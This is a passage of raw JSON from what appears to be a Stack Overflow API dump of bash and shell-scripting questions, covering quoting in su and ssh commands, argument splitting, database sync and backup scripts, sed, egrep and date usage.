\"Am I going about what I'm doing in completely the wrong way?\")</p>\n\n<p><strong>Edit:</strong> I accepted fortea's answer because it walked me through what I didn't understand about variables and getting the output from commands. That said, dogbane and Jonathan Leffler showed better ways of doing what I was doing.</p>\n"},{"tags":["linux","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13139237,"title":"How to escape single quote from parsing inside command?","body":"<p>I have to start the command at the bottom as a specific user in a script. the parameter $vmargs needs to be in single quotes ('$vmargs'). im stuck here because its always parsed.\nthe vmargs parameter has some java options within.</p>\n\n<pre><code> su synesty -c \"screen -dmS appscreen ./eclipse -vmargs \n                -DAPP_ENV=$automatey_note  $vmargs\"\n</code></pre>\n\n<p>Hope anyone can help. </p>\n\n<p>Update: Sorry I saw my question was not clear. The parameter have to be solved. </p>\n\n<pre><code> '-DencryptorCredentials=currentPass|oldPass|1 -Xms512m -Xmx2048m \n -DLOGGING_HOME=configuration/ -Djava.io.tmpdir=/tmp -Dorg.osgi.service.http.port=8081\n -Declipse.ignoreApp=true -Dosgi.noShutdown=true -Xdebug         \n -Xnoagent\n -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,address=4000,server=y,suspend=n \n -Djava.net.preferIPv4Stack=true -DapplyDbMigrations=true -XX:MaxPermSize=128m     \n -XX:-HeapDumpOnOutOfMemoryError '\n</code></pre>\n\n<p>Thats the stuff and I need the single quotes, otherwise shell will not recognize it as parameters</p>\n"},{"tags":["mysql","wordpress","bash","unix","ssh"],"answer_count":1,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13176099,"title":"How to pass variables to SSH command in bash script","body":"<p>I am new to bash scripting, and am attempting write a script to sync my local Wordpress database with a remote one. Here it is:</p>\n\n<pre><code>#!/bin/sh \n\nRUSER=example-admin \nRHOST=ftp.example.com \nRDBUSER=wp_admin\nRDB=wp_db\nRDBHOST=localhost\nRBAK=.backup/latest-remote-db.mssql \n\nLUSER=root\nLPASS=root\nLHOST=localhost\nLDB=wp_db\nLBAK=.backup/latest-local-db.mssql \n\n#dump the contents of my local database\nmysqldump -u$LUSER -p$LPASS -h $LHOST $LDB &gt; $LBAK\n\n#upload my local database to remote\nscp $LBAK $RUSER@$RHOST:~/.backup/\n\n#login to remote host, backup remote database, delete the remote database then recreate it, restore it with the contents of my local database\nssh $RUSER@$RHOST 'mysqldump -uwp_admin -h localhost wp_db &gt; ~/.backup/latest-remote-db.mssql; mysql -uwp_admin -h localhost -Bse \"show databases; drop database wp_db; create database wp_db;\"; mysql -uwp_admin -h localhost wp_db &lt; ~/.backup/latest-local-db.mssql;'\n</code></pre>\n\n<p>The above works fine, yet I'm not satisfied with the final <code>ssh</code> command because all the values are hard-coded. I would prefer to use something like this:</p>\n\n<pre><code>ssh $RUSER@$RHOST 'mysqldump -u$RDBUSER -h $RDBHOST $RDB &gt; ~/$RBAK; mysql -u$RDBUSER -h $RDBHOST -Bse \"drop database $RDB; create database $RDB;\"; mysql -u$RDBUSER -h $RDBHOST $RDB &lt; ~/$LBAK;'\n</code></pre>\n\n<p>However this obviously does not work, because the all the variables are trapped inside quotes and therefore don't get substituted. Can anybody advise on a better way to achieve this? I considered executing a separate script on the remote end to handle all the <code>mysql</code> commands, yet that strikes me as more inefficient.</p>\n"},{"tags":["bash","parameters","word","splitting"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":309,"score":4,"question_id":10062420,"title":"Pass multi-word arguments to a bash function","body":"<p>Inside a bash script function, I need to work with the command-line arguments of the script, and also with another list of arguments. So I'm trying to pass two argument lists to a function, the problem is that multi-word arguments get split.</p>\n\n<pre><code>function params()\n{\n    for PARAM in $1; do\n        echo \"$PARAM\"\n    done\n\n    echo .\n\n    for ITEM in $2; do\n        echo \"$ITEM\"\n    done\n}\n\nPARAMS=\"$@\"\nITEMS=\"x y 'z t'\"\nparams \"$PARAMS\" \"$ITEMS\"\n</code></pre>\n\n<p>calling the script gives me</p>\n\n<pre><code>myscript.sh a b 'c d'\na\nb\nc\nd\n.\nx\ny\n'z\nt'\n</code></pre>\n\n<p>Since there are two lists they must be passed as a whole to the function, the question is, how to iterate the elements while respecting multi-word items enclosed in single quotes 'c d' and 'z t'?</p>\n\n<p>The workaround that I have (see below) makes use of BASH_ARGV so I need to pass just a single list to the function. However I would like to get a better understanding of what's going on and what's needed to make the above work.</p>\n\n<pre><code>function params()\n{\n    for PARAM in \"${BASH_ARGV[@]}\"; do\n        echo \"$PARAM\"\n    done\n\n    echo .\n\n    for ITEM in \"$@\"; do\n        echo \"$ITEM\"\n    done\n}\n\nparams x y 'z t'\n</code></pre>\n\n<p>calling the script gives me</p>\n\n<pre><code>myscript.sh a b 'c d'\nc d\nb\na\n.\nx\ny\nz t\n</code></pre>\n\n<p>... Which is how I need it (except that first list is reversed, but that would be tolerable I guess)</p>\n"},{"tags":["bash","unix"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13174645,"title":"unix script for simple text file modification","body":"<p>i have a file that look like this, the format should be filename followed by 4 entries beginning !.......</p>\n\n<pre><code>76669667-LD_TTFI9255.gz\n!0c0901$\n!02342e$\n!0c0901$\n!030c2a$\n76669707-UN_TTFI5494.gz\n!0c0901$\n!030509$\n76669731-IN_TTFI7570.gz\n!0c0901$\n!023633$\n!0c0901$\n!030e33$\n</code></pre>\n\n<p>I need a commmand that will find occasions where there are less than 4 entries after a file name and add in some blanks.</p>\n\n<p>using example above the new output needs to become </p>\n\n<pre><code>76669667-LD_TTFI9255.gz\n!0c0901$\n!02342e$\n!0c0901$\n!030c2a$\n76669707-UN_TTFI5494.gz\n!0c0901$\n!030509$\n!?\n!?\n76669731-IN_TTFI7570.gz\n!0c0901$\n!023633$\n!0c0901$\n!030e33$\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13175727,"title":"How to pass a string as command line argument for bash script?","body":"<p>I want to pass a string as command line argument to a bash script;\nSimply my bash script is:</p>\n\n<pre><code>&gt;cat test_script.sh\n\nfor i in $*\ndo \necho $i\ndone\n</code></pre>\n\n<p>I typed</p>\n\n<blockquote>\n  <p>bash test_script.sh test1 test2 \"test3 test4\"</p>\n</blockquote>\n\n<p>Output :</p>\n\n<pre><code>test1\ntest2\ntest3\ntest4\n</code></pre>\n\n<p>Output I am expecting:</p>\n\n<pre><code>test1\ntest2\ntest3 test4\n</code></pre>\n\n<p>I tried with backslashes (test1 test2 \"test3\\ test4\") and single quotes but I haven't got the expected result.</p>\n\n<p>How do I get the expected output?</p>\n"},{"tags":["bash","script","openwrt","ash"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":10,"score":0,"question_id":13175493,"title":"OpenWRT ASH script","body":"<p>I am trying to write an ASH script to run on my OpenWRT router.</p>\n\n<p>I have installed onto it nodogsplash, which displays a login page when you first try to authenticate with the router.</p>\n\n<p>nodogsplash comes with a command line utility which allows you to change the password:</p>\n\n<pre><code>ndsctl password newpassword\n</code></pre>\n\n<p>So I am trying to write a script which I can setup as a cron job to run once a day to change the password to something new, however I am struggling to get it to output correctly. My script atm:</p>\n\n<pre><code>#!/bin/ash\nlocal randompassLength\nlocal pass\nrandompassLength=8\npass=&lt;/dev/urandom tr -dc A-Za-z0-9 | head -c $randompassLength\nndsctl password \"$pass\"\n</code></pre>\n\n<p>When I run this I get the output:</p>\n\n<pre><code>miqM2Ah6Password set to .\n</code></pre>\n\n<p>Which seems to chuck the password at the start of the echo and set the password to blank.</p>\n\n<p>Any ideas what I am doing wrong here?</p>\n"},{"tags":["linux","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":13174022,"title":"count processes in shell script","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/185451/quick-and-dirty-way-to-ensure-only-one-instance-of-a-shell-script-is-running-at\">Quick-and-dirty way to ensure only one instance of a shell script is running at a time</a>  </p>\n</blockquote>\n\n\n\n<p>I am new to shell script. </p>\n\n<p>what I wanna do is to avoid running multiple instances of a script. </p>\n\n<p>I have this shell script cntps.sh</p>\n\n<pre><code>#!/bin/bash\ncnt=`ps -e|grep \"cntps\"|grep -v \"grep\"`\necho $cnt &gt;&gt; ~/cntps.log\nif [ $cnt &lt; 1 ];\nthen \n    #do something.\nelse\n    exit 0\nfi\n</code></pre>\n\n<p>if I run it this way <code>$./cntps.sh</code>, it echoes 2</p>\n\n<p>if I run it this way <code>$. ./cntps.sh</code>, it echoes 0</p>\n\n<p>if I run it with <code>crontab</code>, it echoes 3</p>\n\n<p>Could somebody explain to me why is this happening? \nAnd what is the proper way to avoid running multiple instances of a script? </p>\n"},{"tags":["bash","postgresql","shell","crontab"],"answer_count":4,"favorite_count":5,"up_vote_count":20,"down_vote_count":0,"view_count":9806,"score":20,"question_id":2893954,"title":"How to pass in password to pg_dump?","body":"<p>I'm trying to create a cronjob to back up my database every night before something catastrophic happens. It looks like this command should meet my needs:</p>\n\n<pre><code>0 3 * * * pg_dump dbname | gzip &gt; ~/backup/db/$(date +%Y-%m-%d).psql.gz\n</code></pre>\n\n<p>Except after running that, it expects me to type in a password. I can't do that if I run it from cron. How can I pass one in automatically?</p>\n"},{"tags":["linux","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13174943,"title":"Bash : Add an option to an existing command","body":"<p>Is it possible to add an option to an existing Bash command?</p>\n\n<p>For example I would like to run a shell script when I pass -foo to a specific command (cp, mkdir, rm...).</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13174314,"title":"bash - export doesn't work","body":"<p>I'm missing something very elementary. Under Mac OS X. I've tried chmod 0777 setdir.bsh. Must be something wrong with my settings.</p>\n\n<pre><code>#!/bin/bash                                                                                       \nexport proj=/Users/RParadox/projects/testproject/\necho $proj\n</code></pre>\n\n<p>Result:</p>\n\n<pre><code>$ bash setdir.bsh\n/Users/RParadox/projects/testproject/\necho $proj\nnothing??\n</code></pre>\n"},{"tags":["bash","shell","script","sed"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13172601,"title":"Delete specific line with sed without deleting other lines with same prefix","body":"<p>I am trying to delete lines of a file using sed but I don't want to delete these lines unless the search string matches exactly. ie.</p>\n\n<pre><code>#!/bin/bash\nset -x\nfile=\"list1\"\nindex=0\n\nwhile read line ;\n  do\n    if [ ! \"$line\" == \"@@@\" ];\n      then\n        MYARRAY[$index]=\"$line\"\n        #index=$(($index+1))\n        let index++\n    else\n      break\n    fi\ndone &lt; $file\n\n#echo \"MYARRAY is: ${MYARRAY[*]}\"\n#echo \"The file: ${index}\"\n\nindex1=0\nfor i in \"${MYARRAY[@]}\"\ndo\n  lineNumber=$((index1 + 1))\n  sed -i \"/${MYARRAY[$index1]}/d\" \"$file\"\n  let index1++\ndone\n\nsed -i \"/@@@/d\" \"$file\"\n#remove empty lines\nsed -i '/^$/d' \"$file\"\n</code></pre>\n\n<p>So I have a test file (list1):</p>\n\n<pre><code>line1\nline2\nline3\nline4\nline5\nline6\n@@@\nline1_1\nline2_1\n</code></pre>\n\n<p>And after the script has run I end up with all lines deleted because \"line1\" and line2\" are also matching \"line1_1\" and \"line2_1\"</p>\n\n<p>Any help would be appreciated!!</p>\n"},{"tags":["git","bash","git-clone"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":21,"score":2,"question_id":13171288,"title":"from terminal git clone, then move contents to non-empty folder","body":"<p>I'm trying to create a workflow where I create my local project, automatically create the remote bitbucket repo based on the project name, then clone that repo into the local folder I'm working from. The problem is, you can't clone into a folder with files. The workaround so far is to clone into a folder, then move the contents into my working directory.</p>\n\n<p>This is what I have so far that's not working:</p>\n\n<pre><code>git clone https://U:P@bitbucket.org/user-account/{project_name}.git &amp;  mv {project_path}/{project_name}/.git {project_path}/../../\n</code></pre>\n"}]}
{"total":16352,"page":4,"pagesize":100,"questions":[{"tags":["bash","symfony2","automation","yaml","symfony-2.1"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12195370,"title":"Scripted editing of Symfony 2 YAML file breaks the formatting and produces errors","body":"<p>I'm trying to script out our entire installation process of new Symfony 2.1 projects including adding and configuring all our bundles and their dependencies. The end result should be one command that sets up everything so the developer is both forced into our best practices setup, and does not have to spend time on this.</p>\n\n<p>So far this is fairly successful since it is now possible to go from 0 to fully installed CMS in about an hour (mostly due to composer installs). You can see the result here: <a href=\"https://github.com/Kunstmaan/KunstmaanSandbox/blob/feature/update-to-2.1/README.md\" rel=\"nofollow\">https://github.com/Kunstmaan/KunstmaanSandbox/blob/feature/update-to-2.1/README.md</a></p>\n\n<p>The next fase of this project is modifying the Symfony config YAML files. But here I'm stuck.</p>\n\n<p>For the parameters.yml I did this with a ruby script, here is the relevant extract, the full script can be found here: <a href=\"https://github.com/Kunstmaan/KunstmaanSandbox/blob/feature/update-to-2.1/app/Resources/docs/scripts/sandboxinstaller.rb\" rel=\"nofollow\">https://github.com/Kunstmaan/KunstmaanSandbox/blob/feature/update-to-2.1/app/Resources/docs/scripts/sandboxinstaller.rb</a></p>\n\n<pre><code>parametersymlpath = ARGV[1]\nprojectname = ARGV[2]\nparametersyml = YAML.load_file(parametersymlpath)\nparams = parametersyml[\"parameters\"]\nparams[\"searchport\"] = 9200\nparams[\"searchindexname\"] = projectname\nparams[\"sentry.dsn\"] = \"https://XXXXXXXX:XXXXXXXX@app.getsentry.com/XXXX\"\nparams[\"cdnpath\"] = \"\"\nparams[\"requiredlocales\"] = \"nl|fr|de|en\"\nparams[\"defaultlocale\"] = \"nl\"\nparams[\"websitetitle\"] = projectname.capitalize\nFile.open(parametersymlpath, 'w') {|f| f.write(YAML.dump(parametersyml)) }\n</code></pre>\n\n<p>So far so good, but the same type of script fails on the config.yml due to these lines:</p>\n\n<pre><code>imports:\n    - { resource: @KunstmaanMediaBundle/Resources/config/config.yml }\n    - { resource: @KunstmaanAdminBundle/Resources/config/config.yml }\n    - { resource: @KunstmaanFormBundle/Resources/config/config.yml }\n    - { resource: @KunstmaanSearchBundle/Resources/config/config.yml }\n    - { resource: @KunstmaanAdminListBundle/Resources/config/config.yml }\n</code></pre>\n\n<p>The @ is a reserved character according to the YAML spec and Ruby throws an error.</p>\n\n<p>So I switched to php and the Symfony yaml component since at this point in the install there is a full symfony install and i came up with this standalone command: <a href=\"https://gist.github.com/3526251\" rel=\"nofollow\">https://gist.github.com/3526251</a></p>\n\n<p>But when reading and dumping the config.yml file the lines above for example would turn into </p>\n\n<pre><code>imports:\n    - \n      resource: @KunstmaanMediaBundle/Resources/config/config.yml\n    - \n      resource: @KunstmaanAdminBundle/Resources/config/config.yml\n    - \n      resource: @KunstmaanFormBundle/Resources/config/config.yml\n    - \n      resource: @KunstmaanSearchBundle/Resources/config/config.yml\n    - \n      resource: @KunstmaanAdminListBundle/Resources/config/config.yml\n</code></pre>\n\n<p>Which looks like crap and i'm not entirely sure this will even work.</p>\n\n<p>So at this point i'm looking at moving the fully modified config.yml files to the install script and just overwriting the originals. I would rather not go there, since it will take constant maintenance if something changes in the symfony-standard project.</p>\n\n<p>I'm wondering if there is another way?</p>\n"},{"tags":["java","osx","bash","shell","zsh"],"answer_count":2,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":294,"score":4,"question_id":13002155,"title":"Apple's most recent Java update removes Java Preferences, how to change from shell?","body":"<p>Apple's Java update this week removes the Java Preferences.app from Utilities.  When working between different versions of Java in varied development environments it no longer seems easily achievable to change from Java 6 to Sun's 1.7 as before.</p>\n\n<p>I believe that there still should be a shell mechanism in place to accomplish this, however I'm not readily finding it.  <strong><em>How do you PROPERLY change the current active version of Java whilst in a shell session?</em></strong>  </p>\n\n<p>(I say PROPERLY because I want to be sure that all env vars are set appropriately such as JAVA_HOME, it's path, etc.)</p>\n\n<p>Additionally, I thought, a couple of years ago, I had stumbled across a script that would change Java env's for you by simply listing the options and then defining which one to switch to.  It may be that I'm getting confused with the tool in Ubuntu, but I am nearly certain it was for OS X...  It would be helpful to either know what this was or perhaps we should write a quick script, if one doesn't exist, that will meet this need; perhaps inserting it into Homebrew?</p>\n"},{"tags":["bash","ssh","webserver","benchmarking","administration"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":19,"score":1,"question_id":13171607,"title":"Find out information about installed hard- and software using the terminal without admin rights","body":"<p>I have access to a remote server, to which I login via ssh. I don't have admin rights, but I like tofind out as much as possible about the machine, among other things to see If I get what I pay for. So far I tried:</p>\n\n<ol>\n<li><code>top</code> (to get the size of the memory)</li>\n<li><code>uname -a</code> (find out more about the installed kernel,...)</li>\n<li><code>cat /proc/cpuinfo</code> (get information about the CPUs)</li>\n<li><code>df -h</code> (to find out the capacity of the harddisk)</li>\n</ol>\n\n<p>I'm not sure If the ways I've choosen are the best. I also don't know, how this information can be manipulated by the provider or accidently contain incorrect information. At least for the CPUs I found out, that there are still 1GHz instead of 2GHz CPUs on that machine (I pay for 2GHz).</p>\n\n<p>Are there other ways I can use to find out information about the system, even with limited rights? (e.g. if my sever is a virtual server?). Are there benchmark tools, that don't need admin-rights to be installed?</p>\n"},{"tags":["arrays","string","bash","loops","append"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13171370,"title":"Adding a string to the front of array loop?","body":"<pre><code>#!/bin/bash\n#OLDIFS=$IFS\nIFS=$'\\r'\n    fortune_lines=($(fortune | fold -w 90))\n\n    #Screen_Session=$\"{mainscreen}\"\n        Screen_Session=`screen -ls|grep \"\\.\"|grep \"(\"|awk '{print $1}'`\n    Screen_OneLiner=$(screen -p 0 -S ${Screen_Session} -X stuff \"`printf \"${fortune_lines[@]}\\r\"`\")\n#IFS=$OLDIFS;\n    for var in \"${Screen_OneLiner[@]}\"\n      do\n         echo    \"${var}\"\n    done\n</code></pre>\n\n<p>ok this script works (sorta). I need to at the string \"say \" to front of the entire array index.  Currently I can only get it to print out \"say \" to the first line. </p>\n"},{"tags":["perl","bash","unix","awk"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":13161963,"title":"File comparison with multiple columns","body":"<p>I am doing a directory cleanup to check for files that are not being used in our testing environment.  I have a list of all the file names which are sorted alphabetically in a text file and another file I want to compare against.</p>\n\n<p>Here is how the first file is setup:</p>\n\n<pre><code>test1.pl\ntest2.pl\ntest3.pl\n</code></pre>\n\n<p>It is a simple, one script name per line text file of all the scripts in the directory I want to clean up based on the other file below.</p>\n\n<p>The file I want to compare against is a tab file which lists a script that each server runs as a test and there are obviously many duplicates.  I want to strip out the testing script names from this file and compare spit it out to another file, use <code>uniq</code> and <code>sort</code> so that I can <code>diff</code> this file with the above to see which testing scripts are not being used. </p>\n\n<p>The file is setup as such:</p>\n\n<pre><code>server: : test1.pl test2.pl test3.pl test4.sh test5.sh\n</code></pre>\n\n<p>There are some lines with less and some with more.  My first impulse was to make a <code>Perl</code> script to split the line and push the values in an list if they are not there but that seems wholly inefficient.  I am not to experienced in <code>awk</code> but I figured there is more than one way to do it.  Any other ideas to compare these files?</p>\n"},{"tags":["bash","shell","unix","ssh","sed"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13162036,"title":"Error running multiple commands using here document in bash script","body":"<p>I'm trying to execute the following set of commands in 3 remote servers using arrays, using Here Document, but getting an error</p>\n\n<p><strong>code -</strong></p>\n\n<pre><code>ssh -oPasswordAuthentication=no $remoteUser@${SERVER[i]} &lt;&lt;-END_TEXT\nVALUE=`cat /home/cognos/cognos/c8/configuration/cogstartup.xml | grep -i xsd:long | head -1 | cut -d\"&gt;\" -f2 | sed 's/[:/&lt;|crn:value]*//g'`\nVALUE_BACKUP=$VALUE\n........................ (many more lines of code)\nRESULT1=`perl -e '@stats = stat(\"/home/cognos/cognos/c8/configuration/signkeypair\"); print ((time - $stats[9]) &lt; '$VALUE');'`\n\nEND_TEXT\n</code></pre>\n\n<p>And the error:</p>\n\n<pre><code>**error -**\nsyntax error at -e line 1, near \"&lt; )\"\nExecution of -e aborted due to compilation errors.\nsyntax error at -e line 1, near \"&lt; )\"\nExecution of -e aborted due to compilation errors.\nsyntax error at -e line 1, near \"&lt; )\"\nExecution of -e aborted due to compilation errors.\n</code></pre>\n\n<p>Thanks in advanced guys</p>\n\n<p>ps- using scp to copy commands to remote server and then running them using ssh is not a solution i'm looking for.</p>\n"},{"tags":["bash","shell","unix","scripting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13169319,"title":"properties file search and replace","body":"<p>I've got two properties files and I'd like to replace key/value pairs in File A with any matching key/value entries in File B. File A will have more entries than File B - it's not expected that the two files will have the exact same number of entries. As an example:</p>\n\n<pre><code>File A\n\"GB\" = \"United Kingdom\";\n\"SE\" = \"Sweden\";\n\"BR\" = \"Brazil\";\n\"FR\" = \"France\";\n\"ES\" = \"Spain\";\n\"DE\" = \"Germany\";\n\nFile B\n\"GB\" = \"Regno Unito\";\n\"SE\" = \"Svezia\";\n\"BR\" = \"Brasile\";\n\nDesired Result\n\"GB\" = \"Regno Unito\";\n\"SE\" = \"Svezia\";\n\"BR\" = \"Brasile\";\n\"FR\" = \"France\";\n\"ES\" = \"Spain\";\n\"DE\" = \"Germany\";\n</code></pre>\n\n<p>The files are simple UTF-8 encoded .properties files. Is it possible to execute this search and replace using bash?</p>\n\n<p>Thanks,</p>\n\n<p>Sean</p>\n"},{"tags":["bash","console","escaping"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":13169836,"title":"Changing bash home position makes it run slowly. Any fix?","body":"<p>I'm having some trouble with bash. I'm changing my console's home position so I can reserve some rows in the top of the screen to print the current status of the script, and allow all the standard output to scroll in the lower part of the screen. This way, the upper lines showing the status doesn't get removed when the screen scrolls down.</p>\n\n<p>I'm doing this by using these lines to do so, where <code>&lt;RNUM&gt;</code> is the number of rows I need to freeze.</p>\n\n<pre><code> \\033[&lt;RNUM&gt;;r\n \\033[&lt;RNUM&gt;;1H\n</code></pre>\n\n<p>It works, however the console performance is highly lowered, it print lines really slowly (say it takes 4 times more to print the same amount of lines it usually prints).</p>\n\n<p>Does anyone have a fix for the performance issue? Am I using the correct codes? I wasn't able to find any information about this stuff on the net, and I don't recall where I got these codes years ago.</p>\n"},{"tags":["regex","bash","egrep","brainfuck"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13169507,"title":"Incorrect egrep command","body":"<p>The problem is the following:\nI have a document called brain.txt with lines of (brainfuck) code like this:</p>\n\n<pre><code>++++++++++[&gt;++++++++&gt;++++++&gt;+&lt;&lt;&lt;-]&gt;+++.&gt;+++++.&lt;-.+.&gt;&gt;. word\n</code></pre>\n\n<p>The <code>word</code> at the end can really be any word.\nHow can i filter the lines from the document where the length of every sequence of &lt; and > is uneven?</p>\n\n<p>I wrote the following command:</p>\n\n<pre><code>egrep -v '^(([^&lt;]*(&lt;&lt;)*[^&lt;]*)|([^&gt;]*(&gt;&gt;)*[^&gt;]*))*$' brain.txt\n</code></pre>\n\n<p>But it does not seem to work, can anyone explain me what is incorrect about this command please?</p>\n\n<p>EDIT:\nInstead of negating the even ocurrences, i used regex to match the uneven occurences, as Karoly Horvath mentioned. So I wrote the following command:</p>\n\n<pre><code>egrep '^(([^&lt;]*&lt;(&lt;&lt;)*[^&lt;]*)|([^&gt;]*&gt;(&gt;&gt;)*[^&gt;]*))*$' brain.txt\n</code></pre>\n\n<p>But for some reason i still match even lines.</p>\n"},{"tags":["regex","bash","grep"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":13169228,"title":"Every 7th character of the line has to be a +","body":"<p>The problem is the following:\nI have a document called brain.txt with lines of characters like this:</p>\n\n<pre><code>++++++++++[&gt;++++++++&gt;++++++&gt;+&lt;&lt;&lt;-]&gt;+++.&gt;+++++.&lt;-.+.&gt;&gt;. word\n</code></pre>\n\n<p>The <code>word</code> at the end can really be any word.\nHow can i filter the lines from the document where every 7th character is a plus?\nexample: <code>+......+......+......+..... word</code></p>\n\n<p>I wrote the following command:</p>\n\n<pre><code>egrep '^\\+(.{6}\\+)+.{,6}\\s' brain.txt\n</code></pre>\n\n<p>But it does not seem to work, can anyone explain me what is incorrect about this command please?</p>\n"},{"tags":["regex","linux","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13167683,"title":"Extract text from HTML based on table column via Shell Script","body":"<p>I need to write a shell script that reads an html file <code>sample.html</code> and extracts data from a table column, based on another table column. For example, this is the HTML code:</p>\n\n<pre><code>&lt;table style=\"BORDER-COLLAPSE: collapse\"\n  border=\"0\" bordercolor=\"#000000\"\n  cellpadding=\"3\" cellspacing=\"0\" width=\"100%\" height=\"200\"&gt;\n  &lt;tr &gt;\n    &lt;td class=\"fontStyleOne\" width=\"30%\"&gt;\n      &lt;div align=\"left\"&gt;\n      core6690.myserverdomain.com &lt;/div&gt;\n    &lt;/td&gt;\n    &lt;td  class=\"tdfontTwo\" width=\"30%\"&gt;\n      &lt;div class=\"label-styler\" align=\"left\"&gt;\n      admin&lt;/div&gt;\n    &lt;/td&gt;\n  &lt;/tr&gt;\n  &lt;tr &gt;\n    &lt;td class=\"fontStyleOne\" width=\"30%\"&gt;\n      &lt;div align=\"left\"&gt;\n      core6691.myserverdomain.com &lt;/div&gt;\n    &lt;/td&gt;\n    &lt;td  class=\"tdfontTwo\" width=\"30%\"&gt;\n      &lt;div class=\"label-styler\" align=\"left\"&gt;\n      secondary &lt;/div&gt;\n    &lt;/td&gt;\n  &lt;/tr&gt;\n  &lt;tr &gt;\n    &lt;td  class=\"fontStyleOne\" width=\"30%\"&gt;\n      &lt;div align=\"left\"&gt;\n      core6692.myserverdomain.com &lt;/div&gt;\n    &lt;/td&gt;\n    &lt;td  class=\"tdfontTwo\" width=\"30%\"&gt;\n      &lt;div class=\"label-styler\" align=\"left\"&gt;\n      primary &lt;/div&gt;\n    &lt;/td&gt;\n  &lt;/tr&gt;\n&lt;/table&gt;\n</code></pre>\n\n<p>Let's say that I want to determine what the URL for \"admin\" then the result would be core6690.myserverdomain.com; if I my input is \"primary\" then the output would be \"core6692.myserverdomain.com\" and so on... </p>\n\n<p>The HTML page has a lot more data, header tags, footer stuff, etc., but the important stuff that I am looking for is placed inside a table with the exact same structure I list in the code... except it has many more rows, not necessarily just 3 as in this example.</p>\n\n<p>I have seen related answers in this site that seg, grep, regular expressions, awk, and other tools however none of them are close enough to what I am looking for... plus I do not have much experience with any of the approaches as to modify and make them fit my needs.</p>\n\n<p>Any suggestions? Thanks in advance.</p>\n"},{"tags":["linux","bash","unix","date","script"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":64,"score":2,"question_id":13168463,"title":"Using `date` command to get previous, current and next month","body":"<p>I am using below to get previous, current and the next month under <code>Ubuntu</code> 11.04:</p>\n\n<pre><code>LAST_MONTH=`date +'%m' -d 'last month'`\nNEXT_MONTH=`date +'%m' -d 'next month'`\nTHIS_MONTH=`date +'%m' -d 'now'`\n</code></pre>\n\n<p>It works well until today, the last day of October, 2012 (2012-10-31)</p>\n\n<p>I get below result as of now:</p>\n\n<pre><code>$ date\nWed Oct 31 15:35:26 PDT 2012\n$ date +'%m' -d 'last month'\n10\n$ date +'%m' -d 'now'\n10\n$ $ date +'%m' -d 'next month'\n12\n</code></pre>\n\n<p>I suppose the outputs should be <code>9</code>,<code>10</code>,<code>11</code> respectively.</p>\n\n<p>Don't understand why <code>date</code> outputs behave like this. What should be a good way to get consistant <code>previous</code>, <code>current</code> and <code>next</code> month instead?</p>\n"},{"tags":["bash","unix","script","sed","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":50,"score":4,"question_id":13167117,"title":"How to add sum of any column value to last column of last record in a tab delimited file","body":"<p>I need to take sum of col2 and add the value to last column of last record. Please advice, how can we achive this using UNIX shell script.</p>\n\n<pre><code>E.g Input file:\nCol1    Col2    Col3    Col4\nabc 2   A   null\nbcd 3   B   null\nadf 4   C   null\n\nOutput file\nCol1    Col2    Col3    Col4\nabc 2   A   null\nbcd 3   B   null\nadf 4   C   9\n</code></pre>\n"},{"tags":["bash","shell","grep","find"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13167762,"title":"Write a shell script that find-greps files and outputs only those filenames","body":"<p>I want to search files in particular folder and content, then I want to print only the name of the files found.\nI have a command:</p>\n\n<pre><code>for file in $(find from | xargs grep 'move')\ndo \n   echo $file\ndone\n</code></pre>\n\n<p>It prints eg:</p>\n\n<pre><code>from/1.txt:move\nfrom/2.txt:some text\nmove\nfrom/3.txt:move text\n</code></pre>\n\n<p>But I want:</p>\n\n<pre><code>from/1.txt\nfrom/2.txt\nfrom/3.txt\n</code></pre>\n\n<p>I tried to cut that unnecessary part by using:</p>\n\n<pre><code>${file%:*}\n</code></pre>\n\n<p>this gives 